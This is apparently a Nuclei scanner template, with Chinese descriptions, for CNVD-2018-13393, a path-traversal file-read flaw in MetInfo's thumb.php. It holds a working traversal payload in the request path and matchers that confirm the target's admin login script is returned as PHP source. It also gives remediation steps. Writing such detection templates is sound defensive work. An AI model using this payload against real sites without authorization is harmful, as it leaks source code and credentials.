id: CNVD-2018-13393

info:
  name: MetInfo 本地文件包含漏洞（CNVD-2018-13393）
  author: ritikchaddha
  severity: high
  description: |
    MetInfo 的 `include/thumb.php` 对 `dir` 参数路径处理不严，攻击者可通过目录穿越读取站点本地 PHP 文件。模板请求 `thumb.php` 读取后台登录校验脚本，并匹配 PHP 源码片段确认任意文件读取能力。
  impact: |
    - 攻击者可读取程序源码、配置文件或后台敏感逻辑，辅助获取数据库连接、密钥和管理入口信息。
    - 源码泄露会降低后续漏洞利用门槛，并可能暴露二次开发中的硬编码凭据。
  remediation: |
    - 升级 MetInfo 至修复版本，或替换存在缺陷的缩略图处理组件。
    - 对文件路径参数进行规范化和目录白名单校验，禁止 `..`、反斜杠等穿越字符访问站点外文件。
    - 检查 Web 目录权限，避免敏感配置和后台脚本可被下载。
  reference:
    - https://paper.seebug.org/676/
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N
    cvss-score: 8.6
    cwe-id: CWE-22
  metadata:
    max-request: 1
  tags: cnvd2018,cnvd,metinfo,lfi,vuln

http:
  - method: GET
    path:
      - '{{BaseURL}}/include/thumb.php?dir=http\..\admin\login\login_check.php'

    host-redirects: true
    max-redirects: 2

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<?php"
          - "login_met_cookie($metinfo_admin_name);"
        condition: and
